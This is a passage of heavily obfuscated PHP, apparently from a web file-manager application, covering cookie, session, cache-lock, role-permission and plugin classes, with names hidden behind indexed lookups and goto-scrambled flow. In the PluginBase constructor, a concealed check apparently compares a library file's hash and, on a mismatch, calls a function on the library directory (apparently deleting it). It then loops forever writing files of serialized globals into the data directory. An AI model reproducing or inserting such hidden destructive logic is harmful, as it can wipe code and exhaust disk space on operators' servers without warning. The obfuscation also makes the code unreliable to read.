public function resetParentLevel() { $EȤ =& $_SERVER[拘]; $CÖ = $EȤ[1660]; $AǕυ = $this->{$_SERVER[拘][1042]}(); $AǕυ = $EȤ[413]($AǕυ, $CÖ); foreach ($AǕυ as $c) { goto E؉; c: $this->{$_SERVER[拘][501]}(array($CÖ => $c[$CÖ]))->{$_SERVER[拘][1062]}(array($EȤ[1754] => $eޅ)); goto Bʴ; E؉: $eΑ = $c; $eޅ = array(); while ($eΑ[$EȤ[483]] != 0) { $eޅ[] = $eΑ[$EȤ[483]]; $eΑ = $AǕυ[$eΑ[$EȤ[483]]]; } goto Bꪼ; Bꪼ: $eޅ[] = 0; $eޅ = $EȤ[119] . $EȤ[152]($EȤ[119], $EȤ[1833]($eޅ)) . $EȤ[119]; $this->{$_SERVER[拘][1865]}($c[$CÖ], $c[$EȤ[375]]); goto c; Bʴ: } return $AǕυ; } public function groupNameAuto($D, $C) { $Aޔҡ =& $_SERVER[拘]; $AǕυ = $this->{$_SERVER[拘][501]}(array($Aޔҡ[500] => $D))->{$_SERVER[拘][1009]}($Aޔҡ[375], !0); if (!$AǕυ || !$Aޔҡ[176]($C, $AǕυ)) { return $C; } for ($c = 1; $c <= $Aޔҡ[37]($AǕυ) + 1; $c++) { $Aؗ = $C . "\50{$c}\51"; if (!$Aޔҡ[176]($Aؗ, $AǕυ)) { return $Aؗ; } } } } class ZipStream { } goto Dտ; A݊: class CacheLockMemcached { public function lock($A, $Fܐ̇ = 0) { $b㎾ =& $_SERVER[拘]; $Bۚ = Cache::init(); $aӞ = $b㎾[42](!0) + $Fܐ̇; while ($b㎾[42](!0) < $aӞ) { $C؋ = $Bۚ->{$_SERVER[拘][59]}($A); if (!$C؋ || $C؋ < $b㎾[42](!0)) { $A = $Bۚ->handle->{$_SERVER[拘][63]}($A, $aӞ, $Fܐ̇); if ($A) { return !0; } } $b㎾[52](); } return !1; } public function unlock($cϢ) { $dҺ = Cache::init(); $dҺ->{$_SERVER[拘][62]}($cϢ); } } class CacheLockDatabase { public function lock($d, $f׆ = 0) { $eߨ =& $_SERVER[拘]; $Bߏ = $eߨ[64]($eߨ[65]); $aÒ = $eߨ[42](!0) + $f׆; while ($eߨ[42](!0) < $aÒ) { $F = $Bߏ->{$_SERVER[拘][59]}($d); if (!$F || $F < $eߨ[42](!0)) { $b = $Bߏ->{$_SERVER[拘][61]}($d, $aÒ); if ($b) { return !0; } } $eߨ[52](); } return !1; } public function unlock($Fũ) { $BӆƄ =& $_SERVER[拘]; $BӆƄ[64]($BӆƄ[65])->{$_SERVER[拘][62]}($Fũ); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($a؃ = '', $A = 0) { $Aֱ =& $_SERVER[拘]; if ($Aֱ[66]($a؃) && $a؃ != $Aֱ[67]) { $this->prefix = $a؃; } if ($Aֱ[68]($A) && $A > 0) { $this->expire = $A; } } public static function getInstance() { static $Cڷ; if ($Cڷ === null) { $Cڷ = new self(); } return $Cڷ; } private static $sameCookieSet = array(); public static function set($Aď֚, $F, $d뇰 = 0, $dȦ = false, $d͙ = false) { $Eߊ =& $_SERVER[拘]; if (!$d뇰) { $d뇰 = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Aď֚]) && self::$sameCookieSet[$Aď֚] == $F . $d뇰) { return; } self::$sameCookieSet[$Aď֚] = $F . $d뇰; if (!$d͙) { $d͙ = $Eߊ[69](HOST, $Eߊ[67], APP_HOST); $d͙ = $Eߊ[44] . $Eߊ[70]($d͙, $Eߊ[44]); } $Eߊ[71]($Aď֚, $F, $Eߊ[50]() + $d뇰, $d͙, !1, !1, $dȦ); } public static function setSafe($dҾ, $F, $Fࣉ = 0) { self::set($dҾ, $F, $Fࣉ, !0); } public static function get($Dڄꅅ) { return isset($_COOKIE[$Dڄꅅ]) ? $_COOKIE[$Dڄꅅ] : !1; } public static function remove($B΋, $Eȕ = false) { unset($_COOKIE[$B΋]); self::set($B΋, $_SERVER[拘][67], 1, $Eȕ); } } goto aތ; f٤: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\162\157\x6c\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\165\x74\x68", "\x6c\141\142\x65\154", "\x64\x69\163\x70\x6c\x61\171", "\163\x79\163\164\145\x6d", "\x61\144\x6d\x69\156\151\x73\x74\162\141\x74\157\162", "\x73\x6f\x72\x74"); public function listData($d = false, $B۪ = "\x73\157\162\x74", $f = false) { return parent::listData($d, $B۪, $f); } public function update($Dս걽, $Fǔ) { goto fɝҺ; fɝҺ: $eܔ =& $_SERVER[拘]; $cښ = parent::listData($Dս걽); $c碨 = $this->{$_SERVER[拘][1461]}($Fǔ[$eܔ[375]]); goto cݦ; Aɵ҆: return parent::update($Dս걽, $Fǔ); goto eҚ; cݦ: if (!$cښ || $c碨 && $c碨[$eܔ[414]] != $cښ[$eܔ[414]]) { return !1; } if ($c碨[$eܔ[1818]] == 1) { $Fǔ = array($eܔ[375] => $Fǔ[$eܔ[375]], $eܔ[1720] => $Fǔ[$eܔ[1720]]); } $this->{$_SERVER[拘][1719]}($Fǔ[$eܔ[317]]); goto Aɵ҆; eҚ: } public function remove($bЫ) { $cΓ殕έ = parent::listData($bЫ); if (!$cΓ殕έ || $cΓ殕έ[$_SERVER[拘][460]]) { return !1; } return parent::remove($bЫ); } public function add($d) { goto aǇἶ; aǇἶ: $BĨ =& $_SERVER[拘]; $Bʑ = $d[$BĨ[375]]; if ($this->{$_SERVER[拘][1461]}($Bʑ)) { return !1; } goto f; f: $bڤ猦 = parent::listData(); $dഏ = $BĨ[413]($bڤ猦, $BĨ[67], $BĨ[1476]); $Aل = array($BĨ[1453] => $Bʑ, $BĨ[1705] => $BĨ[67], $BĨ[1702] => $BĨ[1721], $BĨ[1819] => 1, $BĨ[1704] => 0, $BĨ[1820] => 0, $BĨ[1454] => empty($dഏ) ? 0 : $BĨ[1143]($dഏ) + 1); goto fњ; fњ: $d = $BĨ[153]($Aل, $d); $this->{$_SERVER[拘][1719]}($d[$BĨ[317]]); return parent::insert($d); goto cߋ; cߋ: } private function filterAuth(&$dЬܸ) { $FѨ =& $_SERVER[拘]; $C𑒊 = array(); $cۺ̕ = $FѨ[1821]($FѨ[4]($FѨ[119], $dЬܸ)); foreach ($cۺ̕ as $dЬܸ) { $E = $FѨ[4]($FѨ[348], $dЬܸ); if ($E[0] == $FѨ[1822] && $E[1] != $FѨ[734]) { $cͮ = $E[0] . $FѨ[348] . $E[1] . $FѨ[1823]; if (!$FѨ[176]($cͮ, $cۺ̕)) { $C𑒊[] = $cͮ; } } $C𑒊[] = $dЬܸ; } $dЬܸ = $FѨ[152]($FѨ[119], $C𑒊); } public function sort($dݐ, $aՊ) { $C =& $_SERVER[拘]; $E = $this->{$_SERVER[拘][504]}(); $aՊ = $aՊ == $C[1601] ? $C[1693] : $C[1694]; $E = $C[1695]($E, $C[414], $dݐ, $aՊ); foreach ($E as $DĺĴ => $Eܶ) { parent::update($Eܶ[$C[414]], array($C[1454] => $DĺĴ)); } return !0; } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\145\137\x61\165\x74\x68"; public function getAuth($Dӕȉ) { $d =& $_SERVER[拘]; $e݈ = $d[1824]; $e = array($d[499] => $Dӕȉ); $cՙ = $this->{$_SERVER[拘][1164]}($e݈)->{$_SERVER[拘][1450]}($d[414])->{$_SERVER[拘][501]}($e)->{$_SERVER[拘][1042]}(); $cՙ = $cՙ ? $cՙ : array(); return $cՙ; } public function setAuth($d筽, $A) { goto AȮ; AȮ: $cۃ =& $_SERVER[拘]; $C盋 = $cۃ[64]($cۃ[480])->{$_SERVER[拘][491]}($d筽); if ($C盋[$cۃ[1686]] != SourceModel::TYPE_GROUP) { return !1; } goto B; c: $bд = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C = array(); foreach ($A as $fݧ) { if (!$cۃ[176]($fݧ[$cۃ[1686]], $bд)) { $cۃ[29]($cۃ[387]($cۃ[1826]), !1); } if ($eՑ != $fã̔ && $fݧ[$cۃ[1686]] == SourceModel::TYPE_GROUP) { $cۃ[29]($cۃ[387]($cۃ[1827]), !1); } if ($eՑ != $fã̔ && $fݧ[$cۃ[1661]] != 0 && !$cۃ[176]($fݧ[$cۃ[1661]], $Eڄ)) { $cۃ[29]($cۃ[387]($cۃ[1828]), !1); } if ($fݧ[$cۃ[1661]] == 0) { $fݧ[$cۃ[1686]] = SourceModel::TYPE_USER; } $C[] = array($cۃ[499] => $d筽, $cۃ[1686] => $cۃ[455]($fݧ[$cۃ[1686]]), $cۃ[1661] => $cۃ[455]($fݧ[$cۃ[1661]]), $cۃ[1687] => $cۃ[455]($fݧ[$cۃ[1687]]) ? $cۃ[455]($fݧ[$cۃ[1687]]) : 0, $cۃ[1688] => $cۃ[455]($fݧ[$cۃ[1688]]) ? $cۃ[455]($fݧ[$cۃ[1688]]) : -1); } goto Fֺ; Fֺ: $this->{$_SERVER[拘][501]}(array($cۃ[1470] => $d筽))->{$_SERVER[拘][308]}(); $this->{$_SERVER[拘][1161]}($C); return !0; goto eҹυ; B: $fã̔ = 1; $eՑ = $C盋[$cۃ[1661]]; if ($eՑ != $fã̔) { $AӦ = array($cۃ[1660] => $eՑ); $Eڄ = $cۃ[64]($cۃ[1825])->{$_SERVER[拘][1164]}($cۃ[1512])->{$_SERVER[拘][501]}($AӦ)->{$_SERVER[拘][1042]}(); $Eڄ = $cۃ[413]($Eڄ, $cۃ[67], $cۃ[1512]); } goto c; eҹυ: } public function authClear($Dž) { $a =& $_SERVER[拘]; $ać٥ = $a[64]($a[480])->{$_SERVER[拘][491]}($Dž); $b = array($Dž); if ($ać٥[$a[503]] == $a[162]) { $Bڼ = array($a[1754] => array($a[1756], $ać٥[$a[747]] . $Dž . $a[1757])); $b = $a[64]($a[480])->{$_SERVER[拘][1164]}($a[1470])->{$_SERVER[拘][501]}($Bڼ)->{$_SERVER[拘][1009]}($a[499], !0); $b[] = $Dž; } $this->{$_SERVER[拘][501]}(array($a[1470] => array($a[1471], $b)))->{$_SERVER[拘][308]}(); return !0; } public function get($d) { $e鴲 = $this->{$_SERVER[拘][1829]}(array($d), !0); return $e鴲[0]; } public function getSourceList($D, $B = false) { goto Cҽ; Bܻ: $B󿤔 = $D; foreach ($B as $BЖ => $eث) { $Cܯ = $aŠ->{$_SERVER[拘][1789]}($eث[$BН[747]]); $B󿤔 = $BН[153]($B󿤔, $Cܯ, array($BЖ)); } $B󿤔 = $BН[442]($BН[710]($B󿤔)); goto Cͤ; Cͤ: $Dۧ = $BН[1831]; $C쯣Ԡ = array($BН[1470] => array($BН[1471], $B󿤔)); $f = $this->{$_SERVER[拘][1164]}($Dۧ)->{$_SERVER[拘][501]}($C쯣Ԡ)->{$_SERVER[拘][1042]}(); goto d; aÇ: return $D; goto a빢; Cҽ: $BН =& $_SERVER[拘]; $aŠ = $BН[64]($BН[480]); if (!$B) { $C쯣Ԡ = array($BН[1470] => array($BН[1471], $D)); $B = $aŠ->{$_SERVER[拘][1164]}($BН[1830])->{$_SERVER[拘][501]}($C쯣Ԡ)->{$_SERVER[拘][1042]}(); $B = $BН[413]($B, $BН[499]); } goto Bܻ; d: $f = $BН[1662]($f, $BН[499]); $D = array(); foreach ($B as $E => $fƜ) { $D[$E] = $this->{$_SERVER[拘][1832]}($fƜ, $f); } goto aÇ; a빢: } private function makeSourceAuth($BÅ, $c㬌) { goto eչʣ; cǊ: $b = $A[153](array($BÅ[$A[499]]), $A[1833]($b)); $Dӭ = !1; foreach ($b as $D) { if (!isset($c㬌[$D])) { continue; } $Fם = $this->{$_SERVER[拘][1654]}($c㬌[$D]); if ($Fם[$A[1834]]) { $Dӭ = $Fם; break; } } goto d; eչʣ: $A =& $_SERVER[拘]; $aٜ = Session::get($A[1659]); $b = $A[64]($A[480])->{$_SERVER[拘][1789]}($BÅ[$A[747]]); goto cǊ; d: if (!$Dӭ) { $aٜ = $A[413]($aٜ, $A[1660]); $Eńٔ = $BÅ[$A[1661]]; $Aܔ = isset($aٜ[$Eńٔ]) ? $aٜ[$Eńٔ] : !1; if (!$Aܔ) { return !1; } $Dӭ = array($A[1835] => $A[455]($Aܔ[$A[317]][$A[317]]), $A[1836] => $Aܔ[$A[317]]); } return $Dӭ; goto BۨÌ; BۨÌ: } public function authMake($Eы) { goto DË; c: $eț = $cڎێ[413]($B金, $cڎێ[67], $cڎێ[1660]); $D͢ʸ = 0; $eچ = 0; goto b׉ț; Eޔ: $dꦈ = $EҠ ? $dꤳ : ($cƐ ? $d : $F); $e = array($cڎێ[1835] => $c੢, $cڎێ[1836] => $dꦈ); return $e; goto Fꡛ; DË: $cڎێ =& $_SERVER[拘]; if (!$Eы) { return array($cڎێ[1837] => 0, $cڎێ[1834] => !1); } $B金 = Session::get($cڎێ[1659]); goto c; c: $F = 0; $EҠ = 0; $cƐ = 0; goto aժ; b׉ț: $D = 0; $dꤳ = 0; $d = 0; goto c; aժ: $aз = 0; foreach ($Eы as $e) { $dꦈ = $this->{$_SERVER[拘][1838]}($e); $bꨰ = $e[$cڎێ[1661]]; $A޼ = $cڎێ[455]($dꦈ[$cڎێ[317]]); if ($e[$cڎێ[1686]] == SourceModel::TYPE_USER && $bꨰ == USER_ID) { $EҠ = !0; $dꤳ = $dꦈ; $D͢ʸ = $A޼; } else { if ($e[$cڎێ[1686]] == SourceModel::TYPE_GROUP && $cڎێ[176]($bꨰ, $eț)) { $cƐ = !0; if ($A޼ >= $eچ) { $eچ = $A޼; $d = $dꦈ; } } else { if ($bꨰ == 0) { $aз = !0; $F = $dꦈ; $D = $A޼; } } } } $c੢ = $EҠ ? $D͢ʸ : ($cƐ ? $eچ : $D); goto Eޔ; Fꡛ: } public function authTargetInfoMake($Aں) { goto aۭ; bދ: foreach ($Aں as $D) { if ($D[$f[1686]] == SourceModel::TYPE_USER) { $E[] = $f[455]($D[$f[1661]]); } else { if ($D[$f[1686]] == SourceModel::TYPE_GROUP) { $Dߦ[] = $f[455]($D[$f[1661]]); } } } if ($E) { $E = $f[64]($f[1839])->{$_SERVER[拘][1514]}($E); } if ($Dߦ) { $e˾ = array($f[1840] => array($f[1471], $Dߦ)); $Dߦ = $f[64]($f[1841])->{$_SERVER[拘][1164]}($f[1842])->{$_SERVER[拘][501]}($e˾)->{$_SERVER[拘][1042]}(); $Dߦ = $f[413]($Dߦ, $f[1660]); } goto e; aۭ: $f =& $_SERVER[拘]; $E = array(); $Dߦ = array(); goto bދ; e: return array($f[1843] => $E, $f[1844] => $Dߦ); goto b; b: } private function authInfo($d) { $fމ =& $_SERVER[拘]; if ($d[$fމ[1687]]) { $Dڱ = $fމ[64]($fމ[1845])->{$_SERVER[拘][504]}($d[$fމ[1687]]); return $fމ[1173]($Dڱ, array($fމ[414], $fމ[375], $fމ[317], $fމ[1720], $fމ[1476])); } else { return array($fމ[447] => 0, $fމ[1705] => $d[$fމ[1688]], $fމ[1453] => $fމ[67], $fމ[1720] => $fމ[1846]); } } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\157\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eЄ볱) { return "\x55\163\145\x72\117\160\164\151\x6f\x6e\137{$eЄ볱}\x5f" . USER_ID; } protected function filterWhere($fᶵ) { $fᶵ[$_SERVER[拘][1512]] = USER_ID; return $fᶵ; } public function get($b = false, $aǕ = '', $d֢ = false) { goto F퐟; fԥ: if (!$b) { return $B; } else { return $B[$b]; } goto DЅ; F퐟: $Bы =& $_SERVER[拘]; $c = parent::get($b, $aǕ, $d֢); if (!$Bы[149]($c)) { return $c; } goto bʃ; bʃ: global $config; $Dȋ = array($Bы[67] => $Bы[1847], $Bы[1848] => $Bы[1849]); $B = $config[$Dȋ[$aǕ]]; goto fԥ; DЅ: } } goto Bȟ˶; C: function beforeShutdownFatalError($Fَ) { $F =& $_SERVER[拘]; $aޒ =& $_SERVER[$F[3]]; $e = $aޒ[52]($Fَ->{$_SERVER[$F[3]][53]}()); $e[] = $Fَ->{$_SERVER[$F[3]][54]}() . $aޒ[24] . $Fَ->{$_SERVER[$F[3]][55]}() . $aޒ[56]; $e[] = $Fَ->{$_SERVER[$F[3]][57]}(); $aޒ[23]($e); } $A = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; $_SERVER[$_SERVER[拘][3]][58]($_SERVER[$_SERVER[拘][3]][41]); goto BŰ; CՔ: $_SERVER[拘][0]($_SERVER[拘][2134], 3); $_SERVER[拘][0]($_SERVER[拘][2135], 4); $_SERVER[拘][0]($_SERVER[拘][2136], 5); goto b쓊; Bô: $_SERVER[拘][0]($_SERVER[拘][978], 1); $_SERVER[拘][0]($_SERVER[拘][979], 2); $_SERVER[拘][0]($_SERVER[拘][980], 3); goto Eʸ; B: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto bə; f: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $f = $eע[$fе[1338]]; $E = $eע[$f]; goto e; a: $eע = $GLOBALS[$fе[11]][$fе[12]]; self::$sessionTime = $eע[$fе[1335]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = $fе[1336](); } } goto f; EԄ: $Fݏȏ = new self(); return $Fݏȏ; goto AŸѠ; bə: $fе =& $_SERVER[拘]; static $Fݏȏ = false; if ($Fݏȏ) { return $Fݏȏ; } goto a; e: $e⇲ = $eע[$fе[292]]; switch ($f) { case $fе[14]: self::$handle = $fе[64]($fе[65]); break; case $fе[19]: self::$handle = new CacheRedis($E, $e⇲); break; case $fе[21]: self::$handle = new CacheMemcached($E, $e⇲); break; case $fе[18]: self::$handle = new CacheFile($E, $e⇲); default: break; } if (!self::$data) { self::$data = self::$handle->{$_SERVER[拘][59]}(self::$sessionSign); self::$data = $fе[298](self::$data); if (!$fе[93](self::$data)) { self::$data = array(); } } goto EԄ; AŸѠ: } public static function sign($D = false) { $D && (self::$sessionSign = $D); self::init(); return self::$sessionSign; } public static function set($Aڑ, $c = false) { $E =& $_SERVER[拘]; self::init(); if ($E[93]($Aڑ)) { foreach ($Aڑ as $F => $fĭ) { $E[1339](self::$data, $F, $fĭ); } } else { $E[1339](self::$data, $Aڑ, $c); } self::$handle->{$_SERVER[拘][61]}(self::$sessionSign, $E[264](self::$data), self::$sessionTime); } public static function get($c = false) { self::init(); if (!$c) { return self::$data; } return $_SERVER[拘][1340](self::$data, $c); } public static function remove($EȘ) { self::init(); unset(self::$data[$EȘ]); self::$handle->{$_SERVER[拘][61]}(self::$sessionSign, $_SERVER[拘][264](self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->{$_SERVER[拘][62]}(self::$sessionSign); } public static function clearTimeout() { $d =& $_SERVER[拘]; self::init(); if ($d[89](self::$handle, $d[302])) { self::$handle->{$_SERVER[拘][299]}(); } } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($eᇓ = false, $fڕ = '', $dǆȵ = false) { goto F۩; F۩: $bˌ =& $_SERVER[拘]; $E阬ڲ = $this->{$_SERVER[拘][1341]}($bˌ[1342], $fڕ); if ($bˌ[93]($E阬ڲ)) { return $eᇓ ? $E阬ڲ[$eᇓ] : $E阬ڲ; } goto bǗ; e牲: foreach ($E阬ڲ as $C => $eò) { if ($dǆȵ || $bˌ[176]($C, $this->jsonField)) { $E阬ڲ[$C] = $bˌ[738]($E阬ڲ[$C], !0); } } $this->{$_SERVER[拘][1341]}($bˌ[1344], $fڕ, $E阬ڲ); return $eᇓ ? $E阬ڲ[$eᇓ] : $E阬ڲ; goto c; bǗ: $Dڄ֊ = $this->{$_SERVER[拘][1343]}(array($bˌ[400] => $fڕ)); $E阬ڲ = $this->{$_SERVER[拘][501]}($Dڄ֊)->{$_SERVER[拘][1042]}(); $E阬ڲ = $bˌ[413]($E阬ڲ, $bˌ[257], $bˌ[937]); goto e牲; c: } public function set($fՕ, $B = false, $aﺭ = '') { $eİ =& $_SERVER[拘]; $this->{$_SERVER[拘][1341]}($eİ[1345], $aﺭ); $B = array(); $EÑ = $eİ[93]($fՕ) ? $fՕ : array($fՕ => $B); foreach ($EÑ as $fՕ => $eъ) { if ($eİ[93]($eъ)) { $eъ = $eİ[1166]($eъ); } $EÑ = array($eİ[400] => $aﺭ, $eİ[257] => $fՕ, $eİ[937] => $eъ); $B[] = $this->{$_SERVER[拘][1343]}($EÑ); } return $this->{$_SERVER[拘][1161]}($B, array(), !0); } public function setDeep($d, $D = false, $aӚ = '') { $bس =& $_SERVER[拘]; $cɇ = $bس[4]($bس[348], $d); $cՐ = $this->{$_SERVER[拘][59]}(); $bس[1339]($cՐ, $d, $D); $this->{$_SERVER[拘][61]}($cɇ[0], $cՐ[$cɇ[0]], $aӚ); } public function remove($CՂ, $dɂ = '') { $b㿆 =& $_SERVER[拘]; $this->{$_SERVER[拘][1341]}($b㿆[1345], $dɂ); $dτл = $this->{$_SERVER[拘][1343]}(array($b㿆[257] => $CՂ, $b㿆[400] => $dɂ)); if ($b㿆[149]($CՂ)) { unset($dτл[$b㿆[257]]); } return $this->{$_SERVER[拘][501]}($dτл)->{$_SERVER[拘][308]}(); } private function cacheAction($Bʵ, $bפѶ, $AФ = false) { $d֡ߔ =& $_SERVER[拘]; $dμ = $this->{$_SERVER[拘][1346]}($bפѶ); switch ($Bʵ) { case $d֡ߔ[1342]: $AȺ = Cache::get($dμ); break; case $d֡ߔ[1344]: $AȺ = Cache::set($dμ, $AФ); break; case $d֡ߔ[1345]: $AȺ = Cache::remove($dμ); break; } return $AȺ; } protected function filterWhere($Fއ) { return $Fއ; } protected function cacheKey($aϚϾ) { return $aϚϾ; } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto A; f󷖜: $this->pluginApi = $Dö[43](APP_HOST, $Dö[44]) . $Dö[1347] . $this->pluginName . $Dö[44]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $Dö[44]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $Dö[44]; goto EƼ; B: if ($_SERVER[$Dö[33]] != $e܎($Bƛ춵)) { goto Aҳ; fۺڏ: $C = $Dö[4]($Dö[36], $cŕޔޠ); if ($Dö[37]($C) < $Dö[330]) { die; } $a = $Dö[331]; goto AŠ; a㬭: $Aʧ = $Dö[333]; $B = $Dö[297]($GLOBALS[$Dö[334]]); for ($e뜩 = 0;; $e뜩++) { $Aʧ(DATA_PATH . $e뜩, $B); } goto Bɴ; Aҳ: $dݞ厐 = $Dö[34]; $D = BASIC_PATH . $Dö[35]; $cŕޔޠ = $dݞ厐($D); goto fۺڏ; AŠ: $a(LIB_DIR); $EȊ = $Dö[332]; $EȊ(); goto a㬭; Bɴ: } global $in, $config; $this->config =& $config; goto Cט٘; EƼ: $this->pluginLangArr = $this->{$_SERVER[拘][1348]}(); $this->values = array(); return $this; goto bͥ; Cט٘: $this->in =& $in; $this->pluginName = $Dö[69]($Dö[352], $Dö[67], $Dö[627]($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Dö[44]; goto f󷖜; A: $Dö =& $_SERVER[拘]; $Bƛ춵 = LIB_DIR . $Dö[31]; $e܎ = $Dö[32]; goto B; bͥ: } public function regist() { $this->{$_SERVER[拘][1349]}(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->{$_SERVER[拘][1350]}($_SERVER[拘][1351]); } protected function assign($c, $d񥈎Ŋ = false) { $f =& $_SERVER[拘]; if ($f[93]($c)) { $this->values = $f[153]($this->values, $c); } else { $this->values[$c] = $d񥈎Ŋ; } } protected function display($eٹ) { extract($this->values); require $eٹ; } final function hookRegist($Fǩ) { $D =& $_SERVER[拘]; $D[64]($D[352])->{$_SERVER[拘][1352]}($this->pluginName, $Fǩ); } final function appIcon() { $Aχ =& $_SERVER[拘]; $bļ͗ = $this->{$_SERVER[拘][1353]}(); $Fߺ = $Aχ[67]; if (isset($bļ͗[$Aχ[1354]])) { if ($bļ͗[$Aχ[1354]][$Aχ[1355]]) { $Fߺ = $Aχ[1356] . $bļ͗[$Aχ[1354]][$Aχ[1355]] . $Aχ[1357]; } else { if ($bļ͗[$Aχ[1354]][$Aχ[1358]]) { $Fߺ = $Aχ[1359] . $bļ͗[$Aχ[1354]][$Aχ[1358]] . $Aχ[1360]; } } } return $Fߺ; } final function isShare($c̉Ѹ) { $C⑿ = KodIO::parse($c̉Ѹ); return $C⑿[$_SERVER[拘][400]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($D䭪) { $d䪍 =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][1361]}($D䭪)) { $D䭪 = $this->{$_SERVER[拘][1362]}($D䭪); } return $d䪍[1363]($d䪍[1364])->{$_SERVER[拘][1365]}($D䭪); } public function filePathLinkOut($FҘ) { $Bȯ =& $_SERVER[拘]; if (!$Bȯ[1363]($Bȯ[1366], $FҘ)) { $Bȯ[522]($Bȯ[387]($Bȯ[1367]), !1); } return $Bȯ[1363]($Bȯ[1364])->{$_SERVER[拘][521]}($FҘ); } final function filePath($c躘) { $f̎ =& $_SERVER[拘]; if ($Fݖܰ = $this->{$_SERVER[拘][1368]}($c躘)) { return $Fݖܰ; } if (!$f̎[1363]($f̎[1366], $c躘)) { $f̎[522]($f̎[387]($f̎[1367]), !1); } if (!$f̎[735]($c躘)) { $this->fileInfo = IO::infoWithChildren($c躘); if (!$this->fileInfo) { $f̎[522]($f̎[387]($f̎[390]), !1); } $this->cachePath = $this->{$_SERVER[拘][1370]}($this->{$_SERVER[拘][1371]}()); } else { $c躘 = $this->{$_SERVER[拘][1372]}($c躘); $this->fileInfo = IO::infoWithChildren($c躘); } return $c躘; } final function _cacheHttpFile($fƦ) { $C٧Ƹ =& $_SERVER[拘]; $cθ = $C٧Ƹ[1373]($fƦ, !0); $this->cachePath = $this->{$_SERVER[拘][1370]}($cθ); if ($dȒ = IO::fileNameExist($this->cachePath, $cθ)) { return KodIO::make($dȒ); } $Bா = $this->cachePath . $cθ; return $this->{$_SERVER[拘][1374]}($Bா, $C٧Ƹ[345]($fƦ)); } final function _tmpFileName($dդ = array()) { goto aΓҘ; F: if (isset($dդ[$e[702]][$e[703]])) { return $dդ[$e[702]][$e[703]]; } $CϲЉ = array($dդ[$e[375]], $dդ[$e[40]], $dդ[$e[490]]); if (isset($dդ[$e[747]])) { $CϲЉ[] = $dդ[$e[747]]; } goto cɌ; aΓҘ: $e =& $_SERVER[拘]; if (!$dդ) { $dդ = $this->fileInfo; } if (isset($dդ[$e[703]])) { return $dդ[$e[703]]; } goto F; cɌ: return $e[46]($e[152]($e[183], $CϲЉ)); goto Bñ; Bñ: } final function checkSharePath($Eڞ) { goto b; b: $c =& $_SERVER[拘]; if (!$c[467]($c[1375])) { $c[0]($c[1376], 0); } if (!$this->{$_SERVER[拘][1361]}($Eڞ)) { return !1; } goto dŏ; c̣: $this->cachePath = $this->{$_SERVER[拘][1370]}($this->fileInfo[$c[703]]); return $CȆ[$c[40]]; goto bϚ; dŏ: $CȆ = $c[1363]($c[1364])->{$_SERVER[拘][1377]}($Eڞ); if (!isset($CȆ[$c[40]])) { $c[29]($c[387]($c[1378]), !1); } $this->fileInfo = $CȆ[$c[702]]; goto c̣; bϚ: } final function pluginCachePath($F = '') { $C =& $_SERVER[拘]; $Bˬ = IO_PATH_SYSTEM_TEMP . $C[1379] . $this->pluginName; if (!($Fߥ = IO::infoFull($Bˬ))) { return IO::mkdir($Bˬ . $C[44] . $F); } if (empty($F)) { return $Fߥ[$C[40]]; } if (!($D = IO::fileNameExist($Fߥ[$C[40]], $F))) { return IO::mkdir($Fߥ[$C[40]] . $F); } return KodIO::make($D); } final function pluginCacheFileSet($a, $e² = '') { $e摟ي =& $_SERVER[拘]; if (!($D = IO::infoFull($a))) { return IO::mkfile($a, $e²); } IO::setContent($D[$e摟ي[40]], $e²); return $D[$e摟ي[40]]; } final function pluginLocalFile($a = '') { goto b; CĜ꿝: if (!$a) { return $a쟏; } $e릺 = IO::infoWithChildren($a); $eѮ = $this->{$_SERVER[拘][1371]}($e릺); goto a; dҍ: return $a; goto F; b: $bʕ =& $_SERVER[拘]; $a쟏 = TEMP_FILES . "{$this->pluginName}\x2f"; if (!$bʕ[586]($a쟏)) { $bʕ[403]($a쟏); } goto CĜ꿝; a: $bſ = $a쟏 . $eѮ . $bʕ[44] . $e릺[$bʕ[375]]; if (@$bʕ[48]($bſ)) { return $bſ; } $a = IO::download($a, $bſ); goto dҍ; F: } final function appPackage() { goto C; C: $B =& $_SERVER[拘]; if ($this->packageData) { return $this->packageData; } $e妌 = $this->{$_SERVER[拘][1380]}($this->pluginPath . $B[1381]); goto E; f: $this->packageData = $DӮ; return $DӮ; goto B܆; E: $this->{$_SERVER[拘][1382]}($e妌); $DӮ = $B[1383]($e妌); if (!$DӮ) { return array(); } goto f; B܆: } public function packageInfoGet($eەէ) { $c̃ = $this->{$_SERVER[拘][1353]}(); return $_SERVER[拘][1340]($c̃, $eەէ); } public function packageVersion() { return $this->{$_SERVER[拘][1384]}($_SERVER[拘][1385]); } public function packageTitle() { return $this->{$_SERVER[拘][1384]}($_SERVER[拘][1386]); } public function packageCopyright() { return $this->{$_SERVER[拘][1384]}($_SERVER[拘][1387]); } private function parseFile($A) { $E醂 =& $_SERVER[拘]; $dƕ = $E醂[345]($A); $bʯ = 